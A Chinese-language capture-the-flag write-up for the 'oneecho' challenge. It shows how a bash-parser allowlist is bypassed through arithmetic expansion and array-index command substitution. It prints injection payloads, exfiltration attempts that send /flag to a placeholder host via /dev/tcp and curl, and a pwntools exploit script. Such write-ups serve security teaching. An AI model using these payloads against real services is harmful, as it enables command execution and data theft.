# oneecho

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d55e3843-2a4a-4b99-8fea-b46791dbec0d)

## 概述

`nc` 進去是一個可以讓你下指令的 shell

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c11bebbe-800a-47c0-a3aa-72e693661878)

然而只能下 `echo` 不能下其他的，目測要 command injection

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4a39314d-020c-4a20-a70c-edb727830d2e)

到 `challenge.js` 來看看他怎檔的。

首先他 require 了 `bash-parser`

```js
const parse = require('bash-parser'); 
```

接著他把指令 parse 成 ast

```js
const ast = parse(cmd);
```

call `check` 做檢查

```js
if (!check(ast)) (
  rl.write('Hacker detected! No hacks, only echo!');
  rl.close();
  return;
}
```

來看看他怎麼檢查的。

```js
const check = ast => {
  if (typeof(ast) === 'string') {
    return true;
  }
  for (var prop in ast) {
    if (prop === 'type' && ast[prop] === 'Redirect') {
      return false;
    }
    if (prop === 'type' && ast[prop] === 'Command') {
      if (ast['name'] && ast['name']['text'] && ast['name']['text'] != 'echo') {
        return false;
      }
    }
    if (!check(ast[prop])) {
      return false;
    }
  }
  return true;
};
```

然後用 [bash-parser-playground](https://vorpaljs.github.io/bash-parser-playground/) 看看 ast 的結構。

```json
{
  "type": "Script",
  "commands": [
    {
      "type": "Command",
      "name": {
        "text": "echo",
        "type": "Word"
      },
      "suffix": [
        {
          "text": "aaa",
          "type": "Word"
        }
      ]
    },
    {
      "type": "LogicalExpression",
      "op": "and",
      "left": {
        "type": "Command",
        "name": {
          "text": "ls",
          "type": "Word"
        },
        "suffix": [
          {
            "text": "aaa",
            "type": "Word"
          }
        ]
      },
      "right": {
        "type": "Pipeline",
        "commands": [
          {
            "type": "Command",
            "name": {
              "text": "ls",
              "type": "Word"
            },
            "suffix": [
              {
                "text": "bbb$(ls ddd)",
                "expansion": [
                  {
                    "loc": {
                      "start": 3,
                      "end": 11
                    },
                    "command": "ls ddd",
                    "type": "CommandExpansion",
                    "commandAST": {
                      "type": "Script",
                      "commands": [
                        {
                          "type": "Command",
                          "name": {
                            "text": "ls",
                            "type": "Word"
                          },
                          "suffix": [
                            {
                              "text": "ddd",
                              "type": "Word"
                            }
                          ]
                        }
                      ]
                    }
                  }
                ],
                "type": "Word"
              }
            ]
          },
          {
            "type": "Command",
            "name": {
              "text": "ls",
              "type": "Word"
            },
            "suffix": [
              {
                "text": "ccc",
                "type": "Word"
              }
            ]
          }
        ]
      }
    }
  ]
}
```

這邊試了部分 command injection 的手法，但可以看到都有成功辨識成 `Command`，而 `check` function 的檢查是 recursive 的，所以理論上上面的這些 payload 檢查都不會過。

## 解題

首先再仔細看看 `check` function

```js
    if (prop === 'type' && ast[prop] === 'Command') {
      if (ast['name'] && ast['name']['text'] && ast['name']['text'] != 'echo') {
        return false;
      }
    }
```

其中 `ast['name']['text']` 會有問題，由於 js week type 的特性，當字串為空值的時候會是 `false`，因此除了 command 為 echo 的指令以外 command 為空值的指令也能用。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f83386d9-1572-4520-816e-227a790e5dcd)

那在何種情況 command 會是空值呢？這邊發現在定義 `environment variable` 的時候 command 會是空值。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/793f7e9d-0597-462b-8b41-898f8dce1d83)

也就是說我們除了下 `echo` 以外也可以定義 `environment variable`，那這能做甚麼，這就能利用 bash 裡面 `Arithmetic Expansion` 也就是 `$((1+1))` 以及 array 也就是 `arr=(aa bb); echo ${arr[0]}` 這個兩個功能的特性。

首先 `Arithmetic Expansion` 裡面如果出現 variable 的話她會**自動**把 variable 內的表達式做展開，也就是 `test='1+1'; echo $((test+1))` 你會得到 `$(((1+1)+1))` 也就是 3。

再來 array 如果在 `Arithmetic Expansion` 內，並且她的 index 有 `command substitution` 也就是 `$()` 的話一樣會執行 command，也就是說 `arr=(1 2); echo $((arr[$(echo 1)]+1))` 這樣會得到 `$((arr[1]+1))` 展開後是 `$((2+1))` 也就是 3。

利用這兩點我們可以組合出這個 `payload='arr[$(RCE)]'; echo $(( payload == 1 ));` 再 `RCE` 的位置可以放任意指令並執行，這點我們可以用這個指令做測試 `arr='1' payload='arr[$(echo 0)]'; echo $(( payload == 1 ))`

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/96e9b383-0109-4222-9fe2-d27e3f52a256)

但是用這種方式所造成的 RCE 沒辦法使用 STDOUT 輸出任何東西，因此要另外想回傳 flag 的方發，遠本試過用網路回傳如：`payload='arr[$(cat /flag > /dev/tcp/<IP>/<PORT>)]'; echo $(( payload == 1 ));` 或者 `payload='arr[$(curl <URL>/$(cat /flag))]'; echo $(( payload == 1 ));` 等等方法，但都沒成功，於是我試架一次他的環境，發現他的環境沒有 `/dev` 然後我把 `nc` 放進去以後發現環境沒網路，所以沒辦法用網路傳 flag 回來。

最後發現他有 `/proc` 所以試著用 `payload='arr[$(cat /flag > /proc/$$/fd/1)]'; echo $(( payload == 1 ));` 不知道為何依然沒成功，後來我發現他的 nodejs 程式每次執行一定再 pid 1 所以我就用 `payload='arr[$(cat /flag > /proc/1/fd/1)]'; echo $(( payload == 1 ));` 就成功拿到 flag 了。

## exploit

```python
import pwn
import base64
import sys
import subprocess

r = pwn.remote("onlyecho.2024.ctfcompetition.com", 1337)

def genpayload(cmd):
    return f"payload='arr[$({cmd})]'; echo $(( payload == 1 )); "

sys.stdout.buffer.write(r.recvuntil(b') solve '))

token = r.recvuntil(b'\n')
sys.stdout.buffer.write(token)

token = token.strip().decode()

r.sendline(subprocess.run(f'bash -c "python3 <(curl -sSL https://goo.gle/kctf-pow) solve {token}"', shell=True, capture_output=True).stdout.strip())

sys.stdout.buffer.write(r.recvrepeat(timeout=1))

r.sendline(genpayload('cat /flag > /proc/1/fd/1').encode())

sys.stdout.buffer.write(r.recvrepeat(timeout=1))
```

## Flag

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/da8df9df-d116-4fd3-8704-363ae2931c8e)

`CTF{LiesDamnedLiesAndBashParsingDifferentials}`



